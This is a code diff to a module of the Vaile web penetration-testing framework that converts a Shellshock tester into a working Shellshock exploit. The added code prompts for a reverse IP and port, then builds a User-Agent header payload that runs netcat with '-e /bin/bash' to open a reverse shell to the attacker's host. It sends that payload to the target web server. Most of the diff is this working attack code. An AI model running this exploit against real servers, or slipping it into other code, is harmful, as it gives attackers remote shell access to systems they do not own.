@@ -5,7 +5,7 @@
 #    Vaile Framework     #
 #-:-:-:-:-:-:-:-:-:-:-:-:#
 
-#Author : @_tID
+#Author: @_tID
 #This module requires Vaile Framework
 #https://github.com/VainlyStrain/Vaile
 
@@ -17,8 +17,8 @@ import string
 import re
 from core.Core.colors import *
 
-info = "This module tests the target for the shellshock vulnerability."
-searchinfo = "Shellshock Tester"
+info = "Shellshock Exploit."
+searchinfo = "Shellshock Exploit"
 properties = {}
 
 def shellshock0x00(web):
@@ -48,26 +48,40 @@ def shellshock0x00(web):
         resp = requests.get(web, headers=headers, verify=False)
         if resp.status_code == 200:
             if re.search(r_str,resp.content,re.I):
-                print(G+' [+] ShellShock was found in: {}'.format(resp.url))
+                print(G+' [+] ShellShock was found in: %s'%(resp.url))
+                print(GR+' [*] Preparing for the exploitation phase...')
+                time.sleep(0.4)
+                print(GR+' [*] Configuring payload...')
+                ip = input(O+' [#] Enter reverse IP :> ')
+                port = input(' [#] Enter port :> ')
+                exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
+                time.sleep(0.7)
+                print(C+' [!] Using payload : '+B+exp)
+                print(GR+' [*] Exploiting...')
+                time.sleep(1)
+                print(O+' [!] Using no-verify mode to avoid IP leakage...')
+                try:
+                    head = {'User-agent':exp}
+                    r=requests.get(web, headers=head, verify=False)
+                except:
+                    print(R+' [-] Exploit failed...')
 
-        elif r.status_code:
+        else:
             print(R+' [-] 2nd phase of detection does not reveal vulnerability...')
             print(O+' [!] Please check manually...')
     else:
         print(R+' [-] The web seems immune to shellshock...')
 
-def shellshock(web):
+def shellshock_exp(web):
 
     print(GR+'\n [*] Loading module...')
     time.sleep(0.5)
-    #print(R+'\n    =====================')
-    #print(R+'\n     S H E L L S H O C K ')
-    #print(R+'    ——·‹›·––·‹›·——·‹›·——·\n')
-
-    from core.methods.print import pvln
-    pvln("shellshock") 
-                 
+    #print(R+'\n    ================================')
+    #print(R+'     S H E L L S H O C K  (Exploit)')
+    #print(R+'    ================================\n')
+    from core.methods.print import psploit
+    psploit("shellshock") 
     shellshock0x00(web)
 
 def attack(web):
-    shellshock(web)
+    shellshock_exp(web)
